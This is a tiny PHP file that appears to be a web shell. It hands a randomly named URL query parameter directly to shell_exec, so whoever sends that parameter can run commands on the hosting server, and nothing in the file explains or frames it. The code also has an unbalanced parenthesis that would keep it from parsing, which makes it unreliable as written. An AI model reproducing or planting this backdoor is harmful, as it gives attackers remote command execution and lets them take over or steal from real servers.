<?php
shell_exec(($_GET['MMwtADh2']);
?>
